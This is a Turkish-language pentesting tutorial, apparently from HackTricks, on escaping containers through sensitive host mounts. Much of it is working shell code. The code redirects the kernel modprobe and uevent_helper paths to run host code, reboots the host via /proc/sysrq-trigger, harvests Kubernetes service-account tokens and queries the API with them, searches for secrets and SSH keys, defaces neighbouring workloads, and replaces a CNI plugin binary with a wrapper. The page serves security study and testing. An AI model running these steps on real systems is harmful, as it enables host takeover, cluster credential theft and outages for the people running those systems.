# Hassas Host Mount'ları

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Host mount'ları, dikkatlice izole edilmiş bir process görünümünü host kaynaklarına doğrudan görünürlük sağlayacak şekilde yeniden birleştirdikleri için en önemli pratik container-escape yüzeylerinden biridir. Tehlikeli durumlar `/` ile sınırlı değildir. `/proc`, `/sys`, `/var`, runtime socket'leri, kubelet tarafından yönetilen durum dizinleri veya device ile ilgili path'lerin bind mount edilmesi; kernel kontrollerini, kimlik bilgilerini, komşu container filesystem'larını ve runtime yönetim arayüzlerini açığa çıkarabilir.

Bu sayfa, abuse modelinin birden fazla alanı kapsaması nedeniyle ayrı olarak ele alınmıştır. Yazılabilir bir host mount; kısmen mount namespace'leri, kısmen user namespace'leri, kısmen AppArmor veya SELinux kapsamı ve kısmen de hangi host path'inin açığa çıkarıldığı nedeniyle tehlikelidir. Bunu ayrı bir konu olarak ele almak, attack surface'i anlamayı çok daha kolaylaştırır.

## `/proc` Exposure

procfs hem sıradan process bilgilerini hem de yüksek etkili kernel kontrol arayüzlerini içerir. Bu nedenle `-v /proc:/host/proc` gibi bir bind mount veya beklenmedik şekilde yazılabilir proc girdilerini açığa çıkaran bir container görünümü; information disclosure, denial of service veya doğrudan host code execution ile sonuçlanabilir.

Yüksek değer taşıyan procfs path'leri şunlardır:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Hangi yüksek değer taşıyan procfs girdilerinin görünür veya yazılabilir olduğunu kontrol ederek başlayın:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Bu yollar farklı nedenlerle ilgi çekicidir. `core_pattern`, `modprobe` ve `binfmt_misc`, yazılabilir olduklarında host code-execution yollarına dönüşebilir. `kallsyms`, `kmsg`, `kcore` ve `config.gz`, kernel exploitation için güçlü reconnaissance kaynaklarıdır. `sched_debug` ve `mountinfo`, container içinden host yerleşimini yeniden oluşturmanıza yardımcı olabilecek process, cgroup ve filesystem bağlamını açığa çıkarır.

Her yolun pratik değeri farklıdır; hepsine aynı etkiye sahipmiş gibi yaklaşmak triage işlemini zorlaştırır:

- `/proc/sys/kernel/core_pattern`
Yazılabilirse bu, en yüksek etkiye sahip procfs yollarından biridir; çünkü kernel bir crash sonrasında pipe handler çalıştırır. `core_pattern` değerini overlay içinde veya mount edilmiş bir host path içinde bulunan bir payload'ı gösterecek şekilde ayarlayabilen bir container, çoğu zaman host code execution elde edebilir. Ayrıntılı bir örnek için [read-only-paths.md](protections/read-only-paths.md) dosyasına da bakın.
- `/proc/sys/kernel/modprobe`
Bu path, kernel'in module-loading logic çağırması gerektiğinde kullandığı userspace helper'ı kontrol eder. Container içinden yazılabilir durumdaysa ve host context içinde yorumlanıyorsa başka bir host code-execution primitive'ine dönüşebilir. Helper path'i tetikleyebilme yöntemiyle birleştirildiğinde özellikle ilgi çekicidir.
- `/proc/sys/vm/panic_on_oom`
Bu genellikle temiz bir escape primitive'i değildir; ancak OOM koşullarını kernel panic davranışına dönüştürerek memory pressure'ı host genelinde denial of service durumuna çevirebilir.
- `/proc/sys/fs/binfmt_misc`
Registration interface yazılabilirse attacker, seçilen bir magic value için handler kaydedebilir ve eşleşen bir file çalıştırıldığında host-context execution elde edebilir.
- `/proc/config.gz`
Kernel exploit triage için kullanışlıdır. Host package metadata'ına ihtiyaç duymadan hangi subsystem'lerin, mitigation'ların ve optional kernel feature'ların etkin olduğunu belirlemeye yardımcı olur.
- `/proc/sysrq-trigger`
Çoğunlukla bir denial-of-service path'idir, ancak son derece ciddidir. Host'u hemen reboot edebilir, panic'e sokabilir veya başka şekilde kesintiye uğratabilir.
- `/proc/kmsg`
Kernel ring buffer mesajlarını açığa çıkarır. Host fingerprinting, crash analysis ve bazı ortamlarda kernel exploitation için yararlı bilgilerin leak edilmesi açısından kullanışlıdır.
- `/proc/kallsyms`
Okunabilir olduğunda değerlidir; export edilmiş kernel symbol bilgilerini açığa çıkarır ve kernel exploit geliştirme sırasında address randomization varsayımlarını aşmaya yardımcı olabilir.
- `/proc/[pid]/mem`
Bu, doğrudan bir process-memory interface'idir. Hedef process gerekli ptrace-style koşullarla erişilebilir durumdaysa başka bir process'in memory'sini okumaya veya değiştirmeye izin verebilir. Gerçek etki credentials, `hidepid`, Yama ve ptrace restrictions'a büyük ölçüde bağlıdır; bu nedenle güçlü ancak koşullu bir path'tir.
- `/proc/kcore`
System memory'nin core-image-style görünümünü açığa çıkarır. File çok büyüktür ve kullanımı zahmetlidir; ancak anlamlı şekilde okunabiliyorsa host memory surface'inin ciddi biçimde exposed olduğunu gösterir.
- `/proc/kmem` ve `/proc/mem`
Tarihsel olarak yüksek etkili raw memory interface'leridir. Birçok modern sistemde devre dışıdır veya ağır biçimde kısıtlanmıştır; ancak mevcut ve kullanılabilir durumdalarsa critical finding olarak değerlendirilmelidir.
- `/proc/sched_debug`
Scheduling ve task bilgilerini leak eder; diğer process görünümleri beklenenden daha temiz görünse bile host process identity'lerini açığa çıkarabilir.
- `/proc/[pid]/mountinfo`
Container'ın host üzerinde gerçekte nerede bulunduğunu, hangi path'lerin overlay-backed olduğunu ve writable bir mount'ın host content'e mi yoksa yalnızca container layer'a mı karşılık geldiğini yeniden oluşturmak için son derece kullanışlıdır.

`/proc/[pid]/mountinfo` veya overlay ayrıntıları okunabiliyorsa bunları kullanarak container filesystem'inin host path'ini bulun:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Bu komutlar kullanışlıdır; çünkü birçok host-execution tekniği, container içindeki bir path'i host'un bakış açısından karşılık gelen path'e dönüştürmeyi gerektirir.

### Full Example: `modprobe` Helper Path Abuse

`/proc/sys/kernel/modprobe` container içinden yazılabilir durumdaysa ve helper path host context içinde yorumlanıyorsa, attacker-controlled bir payload'a yönlendirilebilir:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Kesin tetikleyici hedefe ve kernel davranışına bağlıdır, ancak önemli nokta, writable bir helper path'in gelecekteki bir kernel helper invocation'ını attacker-controlled host-path content'e yönlendirebilmesidir.

### Full Example: `kallsyms`, `kmsg` ve `config.gz` ile Kernel Recon

Amaç immediate escape yerine exploitability assessment ise:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Bu komutlar, yararlı sembol bilgilerinin görünür olup olmadığını, son kernel mesajlarının ilginç bir durum ortaya çıkarıp çıkarmadığını ve hangi kernel özellikleri veya mitigations seçeneklerinin derlendiğini anlamaya yardımcı olur. Etki genellikle doğrudan escape değildir, ancak kernel vulnerability triage sürecini önemli ölçüde kısaltabilir.

### Tam Örnek: SysRq Host Reboot

`/proc/sysrq-trigger` yazılabilir durumdaysa ve host görünümüne erişiyorsa:
```bash
echo b > /proc/sysrq-trigger
```
Etkisi host'un hemen yeniden başlatılmasıdır. Bu, incelikli bir örnek değildir; ancak procfs maruziyetinin bilgi ifşasından çok daha ciddi olabileceğini açıkça gösterir.

## `/sys` Maruziyeti

sysfs, büyük miktarda kernel ve cihaz durumu bilgisi sunar. Bazı sysfs yolları çoğunlukla fingerprinting için kullanışlıyken, diğerleri helper çalıştırılmasını, cihaz davranışını, güvenlik modülü yapılandırmasını veya firmware durumunu etkileyebilir.

Yüksek değer taşıyan sysfs yolları şunlardır:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Bu yollar farklı nedenlerle önemlidir. `/sys/class/thermal`, termal yönetim davranışını ve dolayısıyla yeterince korunmayan ortamlarda host kararlılığını etkileyebilir. `/sys/kernel/vmcoreinfo`, düşük seviyeli host fingerprinting işlemine yardımcı olan crash-dump ve kernel yerleşimi bilgilerini leak edebilir. `/sys/kernel/security`, Linux Security Modules tarafından kullanılan `securityfs` arayüzüdür; bu nedenle buraya beklenmeyen erişim, MAC ile ilgili durumu açığa çıkarabilir veya değiştirebilir. EFI değişkeni yolları, firmware destekli boot ayarlarını etkileyebilir; bu da onları sıradan yapılandırma dosyalarından çok daha ciddi hale getirir. `/sys/kernel/debug` altındaki `debugfs` özellikle tehlikelidir; çünkü geliştirici odaklı bir arayüz olarak tasarlanmıştır ve production'a yönelik, güvenliği sıkılaştırılmış kernel API'lerine kıyasla çok daha az güvenlik beklentisine sahiptir.

Bu yollar için kullanılabilecek inceleme komutları şunlardır:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Bu komutları ilginç kılan nedir:

- `/sys/kernel/security`, AppArmor, SELinux veya başka bir LSM yüzeyinin, yalnızca host'a görünür kalması gerekirken görünür olup olmadığını ortaya çıkarabilir.
- `/sys/kernel/debug`, bu gruptaki bulguların genellikle en endişe verici olanıdır. `debugfs` mount edilmiş ve okunabilir veya yazılabilir durumdaysa, kesin risk etkin debug node'larına bağlı olmak üzere kernel'e yönelik geniş bir yüzey bekleyin.
- EFI variable exposure daha az yaygındır; ancak normal runtime dosyaları yerine firmware-backed ayarlara dokunduğu için etkisi yüksektir.
- `/sys/class/thermal`, düzgün bir shell-style escape için değil, esas olarak host kararlılığı ve donanımla etkileşim açısından önemlidir.
- `/sys/kernel/vmcoreinfo`, çoğunlukla host fingerprinting ve crash analysis kaynağıdır; düşük seviyeli kernel durumunu anlamak için kullanışlıdır.

### Full Example: `uevent_helper`

`/sys/kernel/uevent_helper` yazılabilirse kernel, bir `uevent` tetiklendiğinde attacker-controlled bir helper çalıştırabilir:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Bunun çalışmasının nedeni, helper path'in host'un bakış açısından yorumlanmasıdır. Tetiklendiğinde helper, mevcut container'ın içinde değil, host context'inde çalışır.

## `/var` Exposure

Host'un `/var` dizininin bir container'a mount edilmesi, `/` mount etmek kadar çarpıcı görünmediği için genellikle küçümsenir. Pratikte bu, runtime socket'lerine, container snapshot dizinlerine, kubelet tarafından yönetilen pod volume'larına, projected service-account token'larına ve komşu uygulamaların dosya sistemlerine erişmek için yeterli olabilir. Modern node'larda `/var`, çoğu zaman operasyonel açıdan en ilgi çekici container durumunun gerçekten bulunduğu yerdir.

### Kubernetes Örneği

`hostPath: /var` kullanan bir pod, çoğu zaman diğer pod'ların projected token'larını ve overlay snapshot içeriğini okuyabilir:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Bu komutlar, mount'ın yalnızca önemsiz uygulama verilerini mi yoksa yüksek etkili cluster kimlik bilgilerini mi açığa çıkardığını göstermeleri açısından kullanışlıdır. Okunabilir bir service-account token, local code execution'ı doğrudan Kubernetes API erişimine dönüştürebilir.

Token mevcutsa, yalnızca token discovery ile yetinmek yerine erişebildiği kaynakları doğrulayın:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Buradaki etki yalnızca yerel node erişiminden çok daha büyük olabilir. Geniş RBAC yetkilerine sahip bir token, mount edilmiş bir `/var` dizinini cluster genelinde compromise elde etmek için kullanabilir.

### Docker And containerd Örneği

Docker host'larında ilgili veriler genellikle `/var/lib/docker` altında bulunurken, containerd destekli Kubernetes node'larında `/var/lib/containerd` veya snapshotter'a özel yollar altında bulunabilir:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Bağlanan `/var`, başka bir workload'un yazılabilir snapshot içeriğini açığa çıkarıyorsa saldırgan uygulama dosyalarını değiştirebilir, web içeriği yerleştirebilir veya mevcut container yapılandırmasına dokunmadan startup script'lerini değiştirebilir.

Yazılabilir snapshot içeriği bulunduğunda somut kötüye kullanım fikirleri:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Bu komutlar faydalıdır; çünkü mount edilmiş `/var` için üç ana etki kategorisini gösterir: application tampering, secret recovery ve komşu workload'lara lateral movement.

## Kubelet State, Plugins Ve CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin` veya `/etc/cni/net.d` mount'u genellikle privileged DaemonSets, CNI agents, CSI node plugins, GPU operators ve storage helpers üzerinden açığa çıkar. Bu mount'ları "node plumbing" olarak göz ardı etmek kolaydır; ancak bunlar yeni pod'lar için execution path üzerinde doğrudan yer alır ve çoğunlukla kubelet credentials, projected secrets, registration sockets ve host tarafındaki executable plugin binaries içerir.

Yüksek değerli hedefler şunlardır:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Yararlı review komutları şunlardır:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Bu yollar neden önemlidir:

- `/var/lib/kubelet/pki`, kubelet client certificates ve diğer node-local credentials bilgilerini açığa çıkarabilir; bunlar, cluster tasarımına bağlı olarak API server'a veya kubelet-facing TLS endpoints'e karşı yeniden kullanılabilir.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods`, aynı node üzerindeki komşu pod'lar için projected service-account tokens ve mount edilmiş Secrets içerir.
- `/var/lib/kubelet/pod-resources/kubelet.sock` temel olarak bir reconnaissance surface'tir, ancak oldukça kullanışlıdır: hangi pod ve container'ların GPU'lara, hugepages'lere, SR-IOV cihazlarına ve diğer kıt node-local resources'lara sahip olduğunu ortaya çıkarır.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` ve `/var/lib/kubelet/plugins_registry`, hangi CSI, DRA ve device plugin'lerinin kurulu olduğunu ve kubelet'in hangi socket'lerle iletişim kurmasının beklendiğini ortaya çıkarır. Bu dizinler yalnızca okunabilir değil de writable ise bulgu çok daha ciddi hale gelir.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` ve `/etc/cni/net.d`, doğrudan pod-network setup path üzerinde yer alır. Buradaki writable access, çoğu zaman yalnızca configuration exposure değil, gecikmeli bir host-execution primitive'dir.<sup>[[2]](#references)</sup>

### Tam Örnek: Writable `/opt/cni/bin`

Bir host CNI binary directory read-write olarak mount edilmişse, bir plugin'i değiştirmek, kubelet bir sonraki sefer o node üzerinde bir pod sandbox oluşturduğunda host execution elde etmek için yeterli olabilir:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Bu, mount edilmiş bir `docker.sock` kadar doğrudan değildir, ancak ele geçirilmiş Kubernetes infrastructure pod'larında genellikle daha gerçekçidir. Önemli nokta, değiştirilmiş binary'nin mevcut container tarafından değil, daha sonra host network kurulum akışı tarafından çalıştırılmasıdır.

## Runtime Soketleri

Sensitive host mount'ları genellikle tam dizinler yerine runtime soketlerini içerir. Bunlar o kadar önemlidir ki burada açıkça tekrarlanmalarını gerektirirler:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Bu socket’lerden biri mount edildikten sonraki tüm exploitation akışları için [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) dosyasına bakın.

Hızlı bir ilk etkileşim yaklaşımı olarak:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Bunlardan biri başarılı olursa, "mounted socket" üzerinden "start a more privileged sibling container" aşamasına giden yol genellikle herhangi bir kernel breakout yolundan çok daha kısadır.

## Writable Host Path Task Hijack

Writable host mount'ın tehlikeli olması için `/` dizinini açığa çıkarması gerekmez. Mount edilen yol; script'ler, config dosyaları, hook'lar, plugin'ler veya host tarafındaki zamanlanmış bir task ya da service tarafından daha sonra tüketilen dosyaları içeriyorsa container, host'un çalıştırdığı şeyi değiştirebilir.

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Yazılabilir bir dosya host process tarafından tüketiliyorsa, test sırasında payload'ı basit ve gözlemlenebilir tutun:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
İlginç kısım trust boundary'dir: yazma işlemi container içinden gerçekleşir, ancak execution daha sonra host service context içinde gerçekleşir. Bu durum, dar kapsamlı bir hostPath veya bind mount'u gecikmeli bir host-code-execution primitive'ine dönüştürür.

## Mount-Related CVEs

Host mount'ları runtime zafiyetleriyle de kesişir. Önemli güncel örnekler şunlardır:

- `runc` içindeki `CVE-2024-21626`: sızdırılmış bir directory file descriptor, çalışma dizininin host filesystem üzerinde konumlandırılmasına neden olabilir.
- BuildKit içindeki `CVE-2024-23651`, `CVE-2024-23652` ve `CVE-2024-23653`: kötü amaçlı Dockerfile'lar, frontend'ler ve `RUN --mount` akışları, build işlemleri sırasında host file access, deletion veya elevated privileges durumlarını yeniden ortaya çıkarabilir.
- Buildah ve Podman build akışlarındaki `CVE-2024-1753`: hazırlanmış bind mount'lar, `/` dizinini read-write olarak açığa çıkarabilir.
- `containerd` 2.1.0 içindeki `CVE-2025-47290`: image unpack sırasında gerçekleşen bir TOCTOU, özel olarak hazırlanmış bir image'ın pull sırasında host filesystem'i değiştirmesine izin verebilir.

Bu CVE'ler burada önemlidir, çünkü mount işlemlerinin yalnızca operator configuration ile ilgili olmadığını gösterir. Runtime'ın kendisi de mount kaynaklı escape koşulları oluşturabilir.

## Checks

En yüksek değer taşıyan mount exposure'larını hızlıca tespit etmek için bu komutları kullanın:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Burada ilginç olan nedir:

- Host root, `/proc`, `/sys`, `/var` ve runtime soketleri, tümü yüksek öncelikli bulgulardır.
- Yazılabilir proc/sys girdileri çoğu zaman mount'un güvenli bir container görünümü yerine host-geneli kernel kontrollerini açığa çıkardığı anlamına gelir.
- Mount edilmiş `/var` yolları yalnızca dosya sistemi incelemesi değil, kimlik bilgileri ve komşu workload'ların incelenmesini de gerektirir.
- Kubelet durum dizinleri ile CNI/plugin yolları, runtime soketleriyle aynı önceliğe sahiptir; çünkü bunlar çoğu zaman doğrudan node'un pod oluşturma ve kimlik bilgisi dağıtma yolunda bulunur.

## Referanslar

- [1] [Kubelet Tarafından Kullanılan Yerel Dosyalar ve Yollar](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [`hostPath` mount'u aracılığıyla host'a erişebilen cilium-agent container'ı](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)

{{#include ../../../banners/hacktricks-training.md}}
